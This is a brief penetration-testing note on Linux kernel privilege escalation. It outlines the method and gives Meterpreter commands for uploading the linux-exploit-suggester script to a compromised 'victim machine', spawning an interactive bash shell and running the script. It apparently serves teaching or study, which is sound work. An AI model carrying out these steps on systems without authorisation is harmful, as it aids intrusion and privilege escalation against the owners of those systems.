# Linux Kernel Exploits

## Explanation

- Kernel exploits on Linux will typically target vulnerabilities in the Linux Kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell.

- This process will differ based on the Kernel version and distribution being targeted and the kernel exploit being used.

- Privilege escalation on Linux systems will typically follow the following methodology :
    - Identifying kernel vulnerabilities
    - Downloading, compiling and transferring kernel exploits onto the target system

## Technics

1. Download : https://github.com/The-Z-Labs/linux-exploit-suggester

2. Start meterpreter session in victim machine.

3. Upload LES tool in vicitim machine : 
```
meterpreter > cd /tmp
meterpreter > upload /home/kali/les.sh
```
4. Swith to new shell, and execute the bash script :
```
meterpreter > shell
/bin/bash -i

/tmp$ chmod +x les.sh
/tmp$ ./les.sh
```
